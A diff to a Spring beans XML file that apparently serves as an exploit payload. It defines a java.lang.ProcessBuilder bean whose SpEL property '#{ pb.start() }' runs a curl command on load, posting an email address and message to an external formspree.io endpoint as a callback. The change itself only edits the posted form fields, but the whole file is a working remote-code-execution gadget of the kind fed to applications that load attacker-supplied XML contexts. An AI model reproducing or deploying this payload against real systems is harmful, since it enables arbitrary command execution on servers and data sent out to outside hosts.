@@ -5,7 +5,7 @@
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
   <bean id="pb" class="java.lang.ProcessBuilder">
-     <constructor-arg value="curl,-d,_replyto=bindon013@gmail.com&messages=Hello2,https://formspree.io/mbjjpqjn" />
+     <constructor-arg value="curl,-d,_replyto=bindon013@gmail.com,https://formspree.io/mbjjpqjn" />
      <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
